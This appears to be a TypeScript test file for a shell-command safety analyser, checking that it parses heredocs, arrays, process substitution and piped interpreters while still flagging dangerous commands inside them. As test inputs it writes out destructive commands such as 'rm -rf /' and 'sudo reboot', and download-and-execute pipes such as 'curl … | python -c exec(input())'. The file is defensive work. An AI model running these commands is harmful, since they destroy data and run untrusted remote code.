// SPEC §4.7.2 + BUG-0099: compound commands, array assignments, process
// substitution targets, heredoc bodies and inline-program pipes parse, and
// the commands inside them are still judged.
import { strict as assert } from "node:assert";
import test from "node:test";
import {
	analyseShell,
	matchDangerousShell,
} from "../../../src/kernel/index.ts";

function details(command: string): Array<string> | "unparseable" {
	const parsed = analyseShell(command);
	if (!parsed.ok) {
		return "unparseable";
	}
	return matchDangerousShell(parsed.value).map(
		(violation) => `${violation.class}: ${violation.detail}`,
	);
}

function flagged(command: string): boolean {
	const found = details(command);
	return found !== "unparseable" && found.length > 0;
}

const NL = String.fromCharCode(10);
const DOLLAR = String.fromCharCode(36);
const lines = (...parts: Array<string>): string =>
	parts.join(NL).replaceAll("@{", `${DOLLAR}{`);

test("[§4.7.2] shell analyser parses an if block with a quoted expression (BUG-0099)", () => {
	const block = lines(
		'if [ "@{{ needs.preflight.outputs.dry_run }}" = "true" ]; then',
		'  echo "dry run"',
		"  # a comment with `latest`",
		"  npm publish --dry-run --tag next",
		"else",
		"  npm publish --provenance",
		"fi",
	);
	assert.deepEqual(details(block), []);
});

test("[§4.7.2] shell analyser flags a dangerous command inside if and while bodies (BUG-0099)", () => {
	assert.ok(
		flagged(lines('if [ "@{{ x.y }}" = "true" ]; then', "  rm -rf /", "fi")),
		"rm -rf / in an if body",
	);
	assert.ok(
		flagged("if true; then echo a; else sudo reboot; fi"),
		"sudo in an else body",
	);
	assert.ok(
		flagged(
			lines("while read -r f; do", '  bash -c "rm -rf /; echo $f"', "done"),
		),
		"a quoted bash -c in a while body",
	);
});

test("[§4.7.2] shell analyser parses array assignments and judges their elements (BUG-0099)", () => {
	const loop = lines(
		'record_args=(--author "@{{ github.actor }}")',
		"while IFS= read -r changed_file; do",
		'  if [ -n "$changed_file" ]; then record_args+=(--files="$changed_file"); fi',
		'done < <(git diff --name-only "$base_sha"...HEAD --)',
		'node packages/cli.js "@{record_args[@]}"',
	);
	assert.deepEqual(details(loop), []);
	assert.ok(flagged("arr=($(rm -rf /))"), "a substitution inside an array");
});

test("[§4.7.2] shell analyser descends a process substitution used as a redirection target (BUG-0099)", () => {
	assert.deepEqual(details("cat < <(git diff)"), []);
	assert.deepEqual(details("tee out.log > >(cat)"), []);
	assert.ok(flagged("cat < <(rm -rf /)"));
});

test("[§4.7.2] shell analyser treats a heredoc body as data unless a shell receives it (BUG-0099)", () => {
	const node = lines(
		"node <<'EOF'",
		"const fs = require('fs');",
		"if (!(1 in [])) { throw new Error('x'); }",
		"console.log(`a @{fs} (`);",
		"EOF",
		"echo after",
	);
	assert.deepEqual(details(node), []);
	assert.deepEqual(details(lines("cat <<EOF", "rm -rf /", "EOF")), []);
	assert.ok(flagged(lines("bash <<EOF", "rm -rf /", "EOF")), "bash heredoc");
	assert.ok(flagged(lines("sudo sh <<'EOF'", "echo hi", "EOF")), "sudo sh");
	assert.ok(flagged("sh <<< 'rm -rf /'"), "a here-string fed to sh");
});

test("[§4.7.2] shell analyser fails closed on an unparseable heredoc body fed to a shell (BUG-0099)", () => {
	const bad = details(lines("bash <<EOF", 'echo "unclosed', "EOF"));
	assert.notEqual(bad, "unparseable");
	assert.ok(Array.isArray(bad) && bad.some((e) => e.startsWith("unparseable")));
	assert.equal(details(lines("bash <<EOF", "echo hi")), "unparseable");
});

test("[§4.7.2] shell analyser allows a pipe into an interpreter with an inline program and blocks one without (BUG-0099)", () => {
	assert.deepEqual(
		details(`printf '%s' "$out" | node -e 'process.exit(0)'`),
		[],
	);
	assert.deepEqual(details("echo x | python3 -c 'import sys'"), []);
	for (const bare of ["node", "node -", "sh", "bash", "python", "python -"]) {
		assert.ok(flagged(`echo x | ${bare}`), `echo x | ${bare} stays blocked`);
	}
});

test("[§4.7.2] shell analyser blocks a download piped into an interpreter even with an inline program (BUG-0099)", () => {
	for (const program of [
		`node -e 'process.stdin.pipe(process.stdout)'`,
		`python -c 'exec(input())'`,
		"bash -c 'cat'",
	]) {
		assert.ok(
			flagged(`curl https://x.example/a | ${program}`),
			`download into ${program}`,
		);
		assert.ok(
			flagged(`curl https://x.example/a | tee a.txt | ${program}`),
			`download via tee into ${program}`,
		);
	}
});

test("[§4.7.2] shell analyser blocks a pipe into a shell whose inline program reads stdin (BUG-0099)", () => {
	assert.ok(flagged("cat x | sh -c sh"), "sh -c sh");
	assert.ok(flagged(`cat x | bash -c "node -"`), "bash -c node -");
	assert.ok(flagged("cat x | sh -c 'bash'"), "sh -c bash");
	assert.ok(flagged("cat x | sh -c 'echo a; python'"), "second command");
	assert.deepEqual(details("cat x | sh -c 'wc -l'"), []);
	assert.deepEqual(details("cat x | sh -c 'node -e 1'"), []);
});
